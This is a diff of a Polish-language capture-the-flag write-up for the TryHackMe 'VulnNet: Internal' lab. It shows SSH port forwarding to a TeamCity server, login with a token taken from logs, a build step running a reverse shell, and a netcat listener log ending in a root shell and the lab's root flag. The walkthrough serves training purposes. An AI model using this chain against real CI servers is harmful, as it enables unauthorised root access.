@@ -399,17 +399,7 @@ Podobnie robię z aplikacją ```LinEnum```, którą pobieram z [GitHub](https://
 git clone https://github.com/rebootuser/LinEnum.git
 ```
 Następnie za pomocą ```rsync``` kopiuję plik ```LinEnum.sh``` i jak już zaloguję się przez ssh za pomocą wcześniej utworzonych pary kluczy tworzę raport, który pobieram w celu analizy.
-```
-┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
-└─$ rsync -r LinEnum.sh rsync://rsync-connect@<IP_atakowanej_masz>/files/sys-internal/.ssh/
-┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
-└─$ ssh -i id_rsa sys-internal@<IP_atakowanej_masz>
-
-sys-internal@vulnnet-internal:~$ ./LinEnum.sh -r raport.txt -e .
-```
-![coś_poszło_nie_tak](/screens/v_katalog_TC.png)
-
-Po utworzeniu raportu z aktywnymi usługami za pomocą ```LinEnum``` pobieram go na swoją maszynę. Następnie przeglądam ten raport i znajduję informację o uruchomionej usłudze ```TimeCity``` na uprawnieniach ```root```
+[](/screens/v_LinEnum_raport.png)
 ```
 ┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
 └─$ cat raportLinEnum.txt | grep -A100 -i services | grep root
@@ -556,3 +546,39 @@ sys-internal@vulnnet-internal:/TeamCity$ grep -iR token /TeamCity/logs/ 2>/dev/n
 
 ```
 ![...](/screens/v_token_tc.png)
+
+6. Za pomocą przekierowania ```ssh``` poleceniem ```ssh -i id_rsa -L 4444:localhost:8111 sys-internal@<IP_atakowanej_maszyny>``` przekierowałem pracę "lokalnego hosta" atakowanej maszyny na stój lokalny host.
+![Oops!…I_Did_It_Again](/screens/v_przekierowanie_ssh.png)
+
+Następnie w przeglądarce ppisuję ```http://127.0.0.1:4444/``` i pojawia się możliwość logowania. Zauwarzam możliwość logowania za pomocą użytkownika ```superuser```, tam wykorzystuję znaleziony wcześniej ```token``` w pliku ```catalina.out``` w katalogu ```/TeamCity/log```.
+
+    Uwaga: ten token będzie dla Ciebie inny i zmienia się przy każdym ponownym uruchomieniu komputera.
+
+Następnie tworze nowy projetk. Po stworzeniu go szukam możliwości wykonania kodu, rozgladając się po ```stettings```, zamykając projekt i potwierając go z zakładki górnrj ```Projects``` znajduję poszukiwaną możliwość w zakładce bocznej ```Build Steps```. Dzieki narzędziu [revshells.com](https://www.revshells.com/) stworzyłem kod zwracający mi odwróconą powłokę z możliwością wejścia do katalogu ```root``` tam znajduje się flaga ```root.txt```.
+
+[Loading...](/screens/v_okno_do_logowania_TC.png)
+[cierpliwosci](/screens/v_TC_po_zalogowaniu.png)
+[](/screens/v_reverseshell.png)
+[](/screens/v_wykonanie_reverseshell.png)
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lvp 8080             
+listening on [any] 8080 ...
+10.10.173.242: inverse host lookup failed: Unknown host
+connect to [10.8.78.81] from (UNKNOWN) [10.10.173.242] 44018
+# whoami
+whoami
+root
+# cd /root/     
+cd /root/
+# ls
+ls
+root.txt
+# cat root.txt
+cat root.txt
+THM{e8996faea46df09dba5676dd271c60bd}
+#  
+```
+
+![FINISH_HIM](/screens/v_final.png)
